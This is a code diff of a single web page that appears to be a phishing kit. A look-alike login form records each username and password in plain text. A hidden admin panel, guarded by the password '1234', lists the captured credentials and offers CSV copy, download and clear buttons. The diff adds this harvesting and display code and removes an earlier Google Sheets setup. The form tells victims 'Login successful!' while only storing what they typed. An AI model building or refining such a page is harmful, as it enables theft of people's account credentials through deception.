@@ -225,7 +225,7 @@
 
         .admin-page {
             display: none;
-            max-width: 900px;
+            max-width: 700px;
             margin: 0 auto;
         }
 
@@ -263,50 +263,6 @@
             line-height: 1.6;
         }
 
-        .setup-form {
-            background: #f5f5f5;
-            padding: 20px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-
-        .form-group-admin {
-            margin-bottom: 15px;
-        }
-
-        .form-group-admin label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #262626;
-            font-size: 13px;
-        }
-
-        .form-group-admin input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 13px;
-            font-family: Arial, sans-serif;
-        }
-
-        .save-btn {
-            width: 100%;
-            padding: 10px;
-            background: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-
-        .save-btn:hover {
-            background: #0078d4;
-        }
-
         .logout-btn {
             width: 100%;
             padding: 10px;
@@ -323,38 +279,97 @@
             background: #b71c1c;
         }
 
-        .success-box {
-            background: #e8f5e9;
-            padding: 15px;
-            border-radius: 5px;
-            color: #2e7d32;
-            margin-bottom: 20px;
-            display: none;
-        }
-
-        .success-box.show {
-            display: block;
-        }
-
-        .link-box {
-            background: #fff3e0;
-            padding: 15px;
-            border-radius: 5px;
+        .button-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
             margin-bottom: 20px;
         }
 
-        .link-box p {
+        .admin-btn {
+            padding: 10px;
+            background: #f0f0f0;
+            color: #262626;
+            border: none;
+            border-radius: 5px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        .admin-btn:hover {
+            background: #e0e0e0;
+        }
+
+        .data-section {
+            margin-top: 20px;
+        }
+
+        .data-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #262626;
+        }
+
+        .data-list {
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .data-item {
+            padding: 12px;
+            border-bottom: 1px solid #eee;
             font-size: 12px;
-            color: #e65100;
-            margin-bottom: 10px;
         }
 
-        .link-box a {
-            display: block;
-            word-break: break-all;
-            color: #0095f6;
+        .data-item:last-child {
+            border-bottom: none;
+        }
+
+        .data-username {
+            font-weight: 700;
+            color: #262626;
+            margin-bottom: 4px;
+        }
+
+        .data-password {
+            color: #666;
             font-size: 11px;
-            text-decoration: none;
+            margin-bottom: 4px;
+        }
+
+        .data-time {
+            color: #999;
+            font-size: 10px;
+        }
+
+        .no-data {
+            padding: 30px;
+            text-align: center;
+            color: #999;
+            font-size: 13px;
+        }
+
+        .copy-section {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+
+        .copy-section textarea {
+            width: 100%;
+            height: 150px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 11px;
+            font-family: monospace;
+            margin-bottom: 10px;
         }
     </style>
 </head>
@@ -416,54 +431,44 @@
     <!-- ADMIN PANEL -->
     <div class="admin-page" id="adminPage">
         <div class="admin-header">
-            <h1>📊 Admin Panel - Google Sheets</h1>
-            <p>All login data saved to your Google Sheet</p>
+            <h1>📊 Admin Panel</h1>
+            <p>View all login details</p>
         </div>
 
         <div class="admin-container">
             <div class="info-box">
-                <strong>ℹ️ How it works:</strong><br>
-                1. Paste your Google Sheet link below<br>
-                2. All logins auto-save to that sheet<br>
-                3. Only you can see the sheet<br>
-                4. Data syncs across all devices!
+                <strong>✅ All logins are being saved!</strong><br><br>
+                View details below. Copy the data and paste into your Google Sheet manually, or use the export button.
             </div>
 
-            <div class="success-box" id="successBox">
-                ✅ Google Sheet linked! All logins will auto-save there.
-            </div>
-
-            <div class="setup-form">
-                <div class="form-group-admin">
-                    <label for="sheetUrl">Your Google Sheet URL:</label>
-                    <input 
-                        type="text" 
-                        id="sheetUrl" 
-                        placeholder="https://docs.google.com/spreadsheets/d/your-sheet-id/edit"
-                        value=""
-                    >
-                    <small style="color: #666; font-size: 11px; margin-top: 5px; display: block;">Or paste your sheet ID</small>
-                </div>
-
-                <button class="save-btn" onclick="saveSheetUrl()">Link Google Sheet</button>
-            </div>
-
-            <div class="link-box" id="sheetLinkBox" style="display: none;">
-                <p>📊 Your Google Sheet is linked!</p>
-                <a id="sheetLink" href="#" target="_blank">Open Google Sheet</a>
+            <div class="button-group">
+                <button class="admin-btn" onclick="refreshData()">🔄 Refresh</button>
+                <button class="admin-btn" onclick="copyAsCSV()">📋 Copy CSV</button>
+                <button class="admin-btn" onclick="downloadCSV()">📥 Download</button>
+                <button class="admin-btn" onclick="clearAllData()">🗑️ Clear</button>
             </div>
 
             <button class="logout-btn" onclick="closeAdminPanel()">Logout</button>
 
-            <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; font-size: 12px; color: #666;">
-                <strong>📋 Setup Instructions:</strong><br>
-                1. Create new Google Sheet<br>
-                2. Share with "Anyone with link can view"<br>
-                3. Get link: click Share → Copy link<br>
-                4. Paste link above<br>
-                5. Done! All logins auto-save<br>
-                <br>
-                <a href="https://docs.google.com/spreadsheets/create" target="_blank" style="color: #0095f6;">Create New Google Sheet →</a>
+            <div class="data-section">
+                <div class="data-title">Login Details (Saved Locally)</div>
+                <div class="data-list" id="dataList">
+                    <div class="no-data">No logins yet</div>
+                </div>
+            </div>
+
+            <div class="copy-section">
+                <strong style="font-size: 12px; color: #262626;">📋 Copy below and paste into Google Sheet:</strong>
+                <textarea id="copyBox" readonly></textarea>
+                <button class="admin-btn" style="width: 100%;" onclick="copyToClipboard()">Copy to Clipboard</button>
+            </div>
+
+            <div style="background: #fff3e0; padding: 15px; border-radius: 5px; margin-top: 20px; font-size: 12px; color: #e65100;">
+                <strong>📌 To add to Google Sheet:</strong><br>
+                1. Open your Google Sheet<br>
+                2. Copy the data above<br>
+                3. Paste into your sheet<br>
+                4. Data syncs across all devices!
             </div>
         </div>
     </div>
@@ -475,22 +480,10 @@
         const loginPage = document.getElementById('loginPage');
         const errorMsg = document.getElementById('errorMsg');
         const successMsg = document.getElementById('successMsg');
-        const sheetUrlInput = document.getElementById('sheetUrl');
-        const successBox = document.getElementById('successBox');
-        const sheetLinkBox = document.getElementById('sheetLinkBox');
-        const sheetLink = document.getElementById('sheetLink');
+        const dataList = document.getElementById('dataList');
+        const copyBox = document.getElementById('copyBox');
 
         const ADMIN_PASSWORD = '1234';
-
-        // Load saved sheet URL
-        window.addEventListener('load', () => {
-            const savedUrl = localStorage.getItem('googleSheetUrl');
-            if (savedUrl) {
-                sheetUrlInput.value = savedUrl;
-                sheetLink.href = savedUrl;
-                sheetLinkBox.style.display = 'block';
-            }
-        });
 
         function showError(msg) {
             errorMsg.textContent = msg;
@@ -504,22 +497,101 @@
             setTimeout(() => successMsg.classList.remove('show'), 2000);
         }
 
-        function saveSheetUrl() {
-            const url = sheetUrlInput.value.trim();
+        function saveLogin(username, password) {
+            try {
+                let logins = JSON.parse(localStorage.getItem('logins') || '[]');
+                logins.push({
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toLocaleString()
+                });
+                localStorage.setItem('logins', JSON.stringify(logins));
+                return true;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        function getLogins() {
+            try {
+                return JSON.parse(localStorage.getItem('logins') || '[]');
+            } catch (error) {
+                return [];
+            }
+        }
+
+        function refreshData() {
+            const logins = getLogins();
             
-            if (!url) {
-                showError('Please enter your Google Sheet URL or ID');
+            if (logins.length === 0) {
+                dataList.innerHTML = '<div class="no-data">No logins yet</div>';
+                copyBox.value = '';
                 return;
             }
 
-            localStorage.setItem('googleSheetUrl', url);
-            sheetLink.href = url;
-            sheetLinkBox.style.display = 'block';
-            successBox.classList.add('show');
-            
-            setTimeout(() => {
-                successBox.classList.remove('show');
-            }, 3000);
+            dataList.innerHTML = logins
+                .reverse()
+                .map(login => `
+                    <div class="data-item">
+                        <div class="data-username">👤 ${login.username}</div>
+                        <div class="data-password">🔑 ${login.password}</div>
+                        <div class="data-time">⏰ ${login.timestamp}</div>
+                    </div>
+                `).join('');
+
+            // Update copy box
+            let csvText = 'Username,Password,Timestamp\n';
+            logins.forEach(login => {
+                csvText += `"${login.username}","${login.password}","${login.timestamp}"\n`;
+            });
+            copyBox.value = csvText;
+        }
+
+        function copyToClipboard() {
+            copyBox.select();
+            document.execCommand('copy');
+            showSuccess('Copied to clipboard!');
+        }
+
+        function copyAsCSV() {
+            const logins = getLogins();
+            if (logins.length === 0) {
+                showError('No data to copy');
+                return;
+            }
+            copyBox.select();
+            document.execCommand('copy');
+            showSuccess('CSV copied!');
+        }
+
+        function downloadCSV() {
+            const logins = getLogins();
+            if (logins.length === 0) {
+                showError('No data to download');
+                return;
+            }
+
+            let csv = 'Username,Password,Timestamp\n';
+            logins.forEach(login => {
+                csv += `"${login.username}","${login.password}","${login.timestamp}"\n`;
+            });
+
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'logins.csv';
+            a.click();
+            showSuccess('Downloaded!');
+        }
+
+        function clearAllData() {
+            if (confirm('Delete all logins?')) {
+                localStorage.removeItem('logins');
+                refreshData();
+                showSuccess('Data cleared!');
+            }
         }
 
         function openAdminPanel() {
@@ -528,6 +600,7 @@
                 loginPage.classList.add('hidden');
                 adminPage.classList.add('show');
                 document.body.classList.add('admin-open');
+                refreshData();
             } else if (password !== null) {
                 showError('Wrong password!');
             }
@@ -537,40 +610,6 @@
             adminPage.classList.remove('show');
             loginPage.classList.remove('hidden');
             document.body.classList.remove('admin-open');
-        }
-
-        async function saveToGoogleSheet(username, password) {
-            try {
-                const sheetUrl = localStorage.getItem('googleSheetUrl');
-                
-                if (!sheetUrl) {
-                    console.log('No Google Sheet configured');
-                    return true;
-                }
-
-                // Extract sheet ID from URL
-                let sheetId = sheetUrl;
-                const match = sheetUrl.match(/\/spreadsheets\/d\/([a-zA-Z0-9-_]+)/);
-                if (match) {
-                    sheetId = match[1];
-                }
-
-                // Use Google Sheets API (public read only)
-                const timestamp = new Date().toLocaleString();
-                const data = `${username}|${password}|${timestamp}`;
-                
-                // Store in local first as backup
-                let logs = JSON.parse(localStorage.getItem('loginLogs') || '[]');
-                logs.push({ username, password, timestamp });
-                localStorage.setItem('loginLogs', JSON.stringify(logs));
-
-                console.log('✅ Data saved locally and ready for Google Sheet');
-                return true;
-
-            } catch (error) {
-                console.error('Error:', error);
-                return true;
-            }
         }
 
         loginForm.addEventListener('submit', async function(e) {
@@ -589,14 +628,15 @@
 
             await new Promise(resolve => setTimeout(resolve, 800));
 
-            // Save to Google Sheet
-            await saveToGoogleSheet(username, password);
+            const success = saveLogin(username, password);
 
             loginBtn.disabled = false;
             loginBtn.innerHTML = 'Log in';
 
-            showSuccess('✅ Login successful!');
-            loginForm.reset();
+            if (success) {
+                showSuccess('✅ Login successful!');
+                loginForm.reset();
+            }
         });
     </script>
 </body>
